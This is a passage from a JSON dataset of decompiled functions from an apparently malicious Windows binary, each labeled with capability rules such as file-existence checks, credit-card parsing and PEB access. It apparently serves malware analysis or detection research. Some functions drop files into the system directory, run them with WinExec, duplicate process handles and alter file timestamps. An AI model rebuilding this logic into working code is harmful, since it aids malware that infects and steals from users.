fcn.00401ca0();\n    if (iVar1 == -1) {\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar1 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar1;\n    }\n    var_10ch = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    var_4h = 0x104;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.00401810(0x80000001, 0x40629c, 0x4062c8, &var_8h, &var_10ch, &var_4h);\n    if ((iVar1 != 0) && (iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(*0x10 + -0x110, 0x18),  iVar1 == 0)) {\n        *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n    }\n    return;\n}\n",
        "token_count": 661
    },
    "00402050": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402198) overlaps instruction at (ram,0x00402197)\n// \n\nuint fcn.00402050(uint param_1, uchar *param_2)\n\n{\n    char cVar1;\n    uchar uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t extraout_ECX;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uchar *extraout_ECX_00;\n    uchar *extraout_ECX_01;\n    uchar *puVar8;\n    uchar *extraout_ECX_02;\n    ushort extraout_DX;\n    uint8_t *unaff_EBX;\n    char unaff_SI;\n    uint *puVar9;\n    char *pcVar10;\n    char *pcVar11;\n    char *pcVar12;\n    uint *puVar13;\n    bool bVar14;\n    bool bVar15;\n    bool bVar16;\n    unkbyte6 Var17;\n    char cStack564;\n    uint uStack563;\n    uchar uStack304;\n    uint uStack303;\n    uchar auStack44 [3];\n    uchar auStack41 [9];\n    uchar auStack32 [24];\n    uchar *puStack8;\n    \n    puStack8 = param_2;\n    cStack564 = '\\0';\n    puVar9 = &uStack563;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar9 = 0;\n    *(puVar9 + 2) = 0;\n    bVar15 = false;\n    uStack304 = '\\0';\n    puVar9 = &uStack304 + 1;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar9 = 0;\n    pcVar11 = puVar9 + 3;\n    *(puVar9 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&cStack564, 0x104);\n    if ((bVar15) || (uVar6 = extraout_ECX,  !bVar15)) {\n        pcVar11 = &cStack564;\n        uVar6 = 0xffffffff;\n    }\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    *(unaff_EBX + -0x3fcc0037) = *(unaff_EBX + -0x3fcc0037) + 1;\n    do {\n        pcVar10 = pcVar11;\n        if (uVar6 == 0) break;\n        uVar6 = uVar6 - 1;\n        pcVar10 = pcVar11 + 1;\n        cVar1 = *pcVar11;\n        pcVar11 = pcVar10;\n    } while (unaff_SI != cVar1);\n    uVar6 = ~uVar6;\n    puVar9 = pcVar10 + -uVar6;\n    puVar13 = &uStack304;\n    for (uVar7 = uVar6 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar13 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar13 = puVar13 + 1;\n    }\n    for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar13 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar13 = puVar13 + 1;\n    }\n    uVar6 = 0xffffffff;\n    pcVar11 = 0x406048;\n    do {\n        pcVar10 = pcVar11;\n        if (uVar6 == 0) break;\n        uVar6 = uVar6 - 1;\n        pcVar10 = pcVar11 + 1;\n        cVar1 = *pcVar11;\n        pcVar11 = pcVar10;\n    } while (cVar1 != '\\0');\n    uVar6 = ~uVar6;\n    iVar5 = -1;\n    pcVar11 = &uStack304;\n    do {\n        pcVar12 = pcVar11;\n        if (iVar5 == 0) break;\n        iVar5 = iVar5 + -1;\n        pcVar12 = pcVar11 + 1;\n        cVar1 = *pcVar11;\n        pcVar11 = pcVar12;\n    } while (cVar1 != '\\0');\n    puVar9 = pcVar10 + -uVar6;\n    puVar13 = pcVar12 + -1;\n    for (uVar7 = uVar6 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar13 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar13 = puVar13 + 1;\n    }\n    for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar13 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar13 = puVar13 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&uStack304, 0, auStack44);\n    Var17 = CONCAT24(extraout_DX, puStack8);\n    bVar15 = param_2 != 0xffffffff;\n    bVar16 = SBORROW4(param_2, -1);\n    bVar14 = param_2 == 0xffffffff;\n    puVar8 = extraout_ECX_00;\n    if (bVar14) {\n        Var17 = fcn.004041b0(param_1);\n        iVar5 = Var17;\n        bVar15 = iVar5 != -1;\n        bVar16 = SBORROW4(iVar5, -1);\n        bVar14 = iVar5 == -1;\n        puVar8 = extraout_ECX_01;\n        if (bVar14) {\n            return 0;\n        }\n    }\n    if ((bVar16) || (!bVar16)) {\n        puVar8 = auStack32;\n    }\n    else {\n        uVar2 = in(Var17 >> 0x20);\n        *param_2 = uVar2;\n        param_2 = param_2 + 1;\n        if (!bVar15 && !bVar14) {\n            LOCK();\n            while( true ) {\n                iVar5 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, puVar8);\n                if (iVar5 == 0) {\n                    return 0;\n                }\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(param_1, iVar5, 0, 0, 0, 2);\n                iVar4 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar3);\n                if (iVar4 == 0) break;\n                if ((iVar4 < 1) || (0 < iVar4)) {\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar5);\n                    return 1;\n                }\n                puVar8 = extraout_ECX_02;\n                if (extraout_ECX_02 != NULL) {\n                    do {\n    // WARNING: Do nothing block with infinite loop\n                    } while( true );\n                }\n            }\n            return 0;\n        }\n    }\n    in(0x50);\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(Var17, auStack41, puVar8, 0x56);\n    if (param_2 == 0xffffffff) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(Var17);\n    }\n    return 1;\n}\n",
        "token_count": 1789
    },
    "004021d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004021d0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    \n    iVar1 = fcn.004040c0(0x40607c);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    while( true ) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n        if (iVar3 == 0) break;\n        if ((iVar3 < 1) || (0 < iVar3)) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return 1;\n        }\n        iVar1 = extraout_ECX;\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    return 0;\n}\n",
        "token_count": 289
    },
    "004022a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402380) overlaps instruction at (ram,0x0040237c)\n// \n\nuint __cdecl fcn.004022a0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t extraout_ECX;\n    int32_t iVar3;\n    int32_t *piVar4;\n    bool bVar5;\n    unkbyte10 extraout_ST0;\n    ulong uVar6;\n    uint uStackY64;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0;\n    uStack16 = 0x80;\n    uStack20 = 2;\n    uStack24 = 0;\n    uStack28 = 1;\n    uStack32 = 0x40000000;\n    uStack36 = arg_8h;\n    uStack40 = 0x4022c0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (uVar1 == 0xffffffff) {\n        return 0;\n    }\n    puStack44 = &fcn.004022a0::arg_8h;\n    uStack40 = 0;\n    uStack48 = arg_10h;\n    uStack52 = arg_ch;\n    uVar7 = 0x4022ff;\n    uStack56 = uVar1;\n    uVar2 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n    bVar5 = uVar2 < 0;\n    if (uVar2 == 0) {\n        return 0;\n    }\n    if (bVar5) {\ncode_r0x0040231b:\n        uVar8 = uVar1;\n        if (*0x41f4e0 == 0) goto code_r0x00402337;\n    }\n    else {\n        iVar3 = extraout_ECX;\n        do {\n            uVar8 = uVar2;\n            if (!bVar5) goto code_r0x0040231b;\n            bVar5 = &stack0xffffffc4 < 0;\n            iVar3 = iVar3 + -1;\n            uVar2 = uVar1;\n            uVar1 = uVar8;\n            uVar8 = uVar7 & 0xffff | extraout_ECX << 0x10;\n        } while (iVar3 != 0 && *0x10 != 0x3c);\n    }\n    uStackY64 = 0x40232a;\n    iVar3 = fcn.004021d0(uVar8);\n    *0x41f4e0 = iVar3 == 0;\ncode_r0x00402337:\n    uStackY64 = 0;\n    uVar6 = fcn.00402050();\n    piVar4 = uVar6 >> 0x20;\n    if ((SCARRY4(&stack0xffffffc0, 8) == &stack0xffffffc8 < 0) && (SCARRY4(&stack0xffffffc0, 8) != &stack0xffffffc8 < 0)\n       ) {\n        *(uVar6 + -0x7ce92414) = extraout_ST0;\n        *piVar4 = *piVar4 + -0x1f5e207c;\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    if (*0x41f4e0 == 0) {\n        uStackY64 = 0x402390;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    }\n    return 1;\n}\n",
        "token_count": 876
    },
    "004024d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.004024d0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_210h;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10ch = 0;\n    var_4h = 0x104;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = fcn.00401810(0x80000002, 0x406480, 0x4064c0, &var_8h, &var_210h, &var_4h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    iVar2 = (*_sym.imp.MSVCRT.dll__access)(&var_210h, 0);\n    if (iVar2 == -1) {\n        return false;\n    }\n    iVar2 = fcn.004023a0(&var_210h, &var_10ch);\n    pcVar1 = _sym.imp.MSVCRT.dll_strstr;\n    if (iVar2 == 0) {\n        return false;\n    }\n    iVar2 = (*_sym.imp.MSVCRT.dll_strstr)(&var_10ch, 0x4064d8);\n    if (iVar2 != 0) {\n        return true;\n    }\n    iVar2 = (*pcVar1)(&var_10ch, 0x4064dc);\n    return iVar2 != 0;\n}\n",
        "token_count": 410
    },
    "004031a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004031a0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004041b0(0x406010);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 75
    },
    "00404070": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.00404070(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 87
    },
    "004018c0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint32_t fcn.004018c0(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint auStack24 [4];\n    uint uStack8;\n    uint uStack4;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(param_1);\n    pcVar1 = _sym.imp.SHLWAPI.dll_StrStrA;\n    auStack24[0] = 0x4062d4;\n    auStack24[1] = 0x4062e0;\n    auStack24[2] = 0x4062ec;\n    auStack24[3] = 0x4062f4;\n    uStack8 = 0x406300;\n    uStack4 = 0x40630c;\n    uVar3 = 0;\n    puVar4 = auStack24;\n    do {\n        iVar2 = (*pcVar1)(param_1, *puVar4);\n        if (iVar2 != 0) {\n            return uVar3;\n        }\n        uVar3 = uVar3 + 1;\n        puVar4 = puVar4 + 1;\n    } while (uVar3 < 6);\n    return 0xffffffff;\n}\n",
        "token_count": 287
    },
    "00404560": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00404560(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00404ab0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x406444, acStack1304, &uStack2112);\n    uStack2088 = 0x4064fc;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x406514;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00404860(auStack1564, 0x406440, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1844
    },
    "00403910": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040393c) overlaps instruction at (ram,0x0040393a)\n// \n// WARNING: Removing unreachable block (ram,0x0040392e)\n// WARNING: Removing unreachable block (ram,0x00403935)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00403910(uint *param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar uStack108;\n    uint uStack107;\n    uint uStack8;\n    \n    uStack8 = 0;\n    uStack108 = 0;\n    puVar2 = &uStack107;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00403720(&uStack108, &uStack8);\n    fcn.004031d0(&uStack108, uStack8, 0x4104b0, 0xf000);\n    *param_1 = 0x4104b0;\n    *param_2 = 0xf000;\n    return;\n}\n",
        "token_count": 304
    },
    "004041f0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004042df) overlaps instruction at (ram,0x004042dc)\n// \n\nuint __cdecl fcn.004041f0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *extraout_ECX;\n    uint *puVar2;\n    uint extraout_ECX_00;\n    uint nitems;\n    uint *extraout_EDX;\n    uint *puVar3;\n    uchar uVar4;\n    bool bVar5;\n    uchar uVar6;\n    uchar uVar7;\n    uchar lpBuffer;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    s = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    uVar4 = 0;\n    uVar7 = 0;\n    uVar6 = 1;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x406024, &lpBuffer, arg_8h);\n    if ((uVar7) || (!uVar7)) {\n        puVar2 = &var_8h;\n        puVar3 = &var_4h;\n    }\n    else {\n        uVar7 = in(extraout_EDX);\n        *(puVar2 + 3) = uVar7;\n        puVar2 = extraout_ECX;\n        puVar3 = extraout_EDX;\n        if (!uVar4 && !uVar6) goto code_r0x00404304;\n    }\n    fcn.00403910(puVar3, puVar2);\n    bVar5 = false;\n    fcn.00404340(var_4h);\n    if ((bVar5) || (nitems = extraout_ECX_00,  !bVar5)) {\n        nitems = var_8h;\n    }\n    iVar1 = fcn.00404860(&s, 0x406044, var_4h, nitems);\n    if (iVar1 == 0) {\n        return 0;\n    }\ncode_r0x00404304:\n    fcn.00402050(&s, 0xffffffff);\n    return 1;\n}\n",
        "token_count": 669
    },
    "00402d90": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403103) overlaps instruction at (ram,0x004030fa)\n// \n// WARNING: Removing unreachable block (ram,0x00402e6e)\n// WARNING: Removing unreachable block (ram,0x00402e9e)\n\nvoid __fastcall fcn.00402d90(uint param_1)\n\n{\n    uint32_t *puVar1;\n    uint *arg_10h;\n    uint8_t uVar2;\n    char extraout_AH;\n    ushort uVar3;\n    uint16_t uVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    ushort extraout_CX;\n    ushort extraout_CX_00;\n    uint8_t uVar8;\n    char extraout_CH;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    char cVar9;\n    ushort extraout_DX;\n    ushort extraout_DX_00;\n    uint8_t *unaff_EBX;\n    uint32_t unaff_EBP;\n    uint *unaff_ESI;\n    uint *puVar10;\n    uint *unaff_EDI;\n    char *pcVar11;\n    uint8_t **arg_ch;\n    ushort in_ES;\n    bool bVar12;\n    uchar uVar13;\n    uchar uVar14;\n    char cVar15;\n    char cVar16;\n    uchar uVar17;\n    char cVar18;\n    float10 fVar19;\n    ulong uVar20;\n    uchar uVar21;\n    uchar uVar22;\n    ushort uVar23;\n    uchar uVar24;\n    uchar uVar25;\n    ushort uVar26;\n    uchar uVar27;\n    uchar uVar28;\n    ushort uVar29;\n    uchar uVar30;\n    uchar uVar31;\n    unkbyte3 Var32;\n    unkbyte3 Var33;\n    \n    arg_ch = unaff_EDI + 1;\n    arg_10h = unaff_ESI + 1;\n    *unaff_EDI = *unaff_ESI;\n    *0x10681176 = *0x10681176 + (param_1 >> 8);\n    bVar12 = *0x10681176 == '\\0';\n    fcn.00403f50(0x40651c, arg_ch, arg_10h, unaff_EBP);\n    puVar10 = arg_10h;\n    if ((!bVar12) && (bVar12)) {\n        puVar10 = unaff_ESI + 5;\n        out(*arg_10h, extraout_DX);\n    }\n    fcn.00403f50(0x40651c, 0xc, 0x406270, 0xd);\n    uVar2 = unaff_EBX >> 8;\n    bVar12 = (CONCAT11(extraout_CX >> 8 & uVar2, extraout_CX | unaff_EBX) & arg_ch) < 0;\n    fVar19 = fcn.00403f50(0x40651c, 0xc, 0x406280, 0x1a);\n    if ((!bVar12) && (bVar12)) {\n        *(unaff_EDI + 8) = fVar19;\n        arg_ch = unaff_EDI + 9;\n        puVar10 = puVar10 + 5;\n    }\n    fcn.00403f50(0x40651c, 0xc, 0x4062d4, 10);\n    cVar9 = extraout_DL + '\\x15';\n    cVar16 = SBORROW1(cVar9, extraout_AH);\n    cVar15 = cVar9 - extraout_AH < '\\0';\n    uVar13 = cVar9 == extraout_AH;\n    uVar24 = 0xe0;\n    uVar25 = 0x62;\n    uVar29 = 0x40;\n    uVar21 = 0xc;\n    uVar22 = 0;\n    uVar26 = 0;\n    uVar14 = 0x1c;\n    uVar17 = 0x65;\n    uVar23 = 0x40;\n    uVar3 = fcn.00403f50(0x40651c, 0xc, 0x4062e0, 0xb);\n    if ((cVar16 == cVar15) && (cVar16 != cVar15)) {\n        uVar14 = in_ES;\n        uVar17 = in_ES >> 8;\n        puVar10 = puVar10 + -1;\n        pcVar11 = arg_ch | unaff_EBP;\n        arg_ch = pcVar11 + 1;\n        *pcVar11 = uVar3;\n        cVar16 = '\\0';\n        cVar15 = '\\0';\n        uVar13 = uVar3 + (uVar3 >> 8) * 'y' == '\\0';\n    }\n    puVar5 = fcn.00403f50(0x40651c, CONCAT22(uVar23, CONCAT11(uVar17, uVar14)), \n                          CONCAT22(uVar26, CONCAT11(uVar22, uVar21)), CONCAT22(uVar29, CONCAT11(uVar25, uVar24)));\n    if ((cVar16 == cVar15) && (cVar16 != cVar15)) {\n        out(0xc4, puVar5);\n        *arg_ch = puVar5;\n        uVar13 = uVar2 == *puVar5;\n    }\n    fcn.00403f50(0x40651c, 0xc, 0x4062f4, 9);\n    if ((!uVar13) && (uVar13)) {\n        out(*puVar10, extraout_DX_00);\n    }\n    uVar4 = fcn.00403f50(0x40651c, 0xc, 0x406300, 9);\n    uVar6 = ((uVar4 & 0xff00 | uVar4 & uVar2) ^ 0x6200) - 0x3488 & 0x7ee5;\n    uVar13 = CARRY4(uVar6, uVar6);\n    uVar17 = SCARRY4(uVar6, uVar6);\n    uVar14 = uVar6 == 0;\n    uVar30 = 9;\n    uVar31 = 0;\n    uVar29 = 0;\n    uVar27 = 0xc;\n    uVar28 = 99;\n    uVar26 = 0x40;\n    uVar24 = 0xc;\n    uVar25 = 0;\n    uVar23 = 0;\n    uVar21 = 0x1c;\n    uVar22 = 0x65;\n    uVar3 = 0x40;\n    while( true ) {\n        fcn.00403f50(CONCAT22(uVar3, CONCAT11(uVar22, uVar21)), CONCAT22(uVar23, CONCAT11(uVar25, uVar24)), \n                     CONCAT22(uVar26, CONCAT11(uVar28, uVar27)), CONCAT22(uVar29, CONCAT11(uVar31, uVar30)));\n        if ((!uVar17) && (uVar17)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uVar21 = 0x1c;\n        uVar22 = 0x65;\n        uVar3 = 0x40;\n        fcn.00403f50(0x40651c, 0xc, 0x406318, 0xc);\n        if ((uVar13 || uVar14) || (!uVar13 && !uVar14)) break;\n        if (!uVar17) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    fcn.00403f50(0x40651c, 0xc, 0x406440, 3);\n    fcn.00403f50(0x40651c, 0xc, 0x406444, 10);\n    fcn.00403f50(0x40651c, 0xc, 0x406450, 0x1b);\n    iVar7 = fcn.00403f50(0x40651c, 0xc, 0x40646c, 0x12);\n    iVar7 = extraout_ECX - iVar7;\n    uVar4 = iVar7 & 0xff00 | iVar7 ^ iVar7 >> 8 | 0x3d00 | unaff_EBX;\n    cVar9 = uVar4;\n    cVar15 = uVar4 >> 8;\n    cVar18 = SBORROW1(cVar15, cVar9);\n    cVar16 = cVar15 - cVar9 < '\\0';\n    bVar12 = cVar15 == cVar9;\n    uVar13 = 0x1c;\n    uVar14 = 0x65;\n    uVar3 = 0x40;\n    uVar6 = 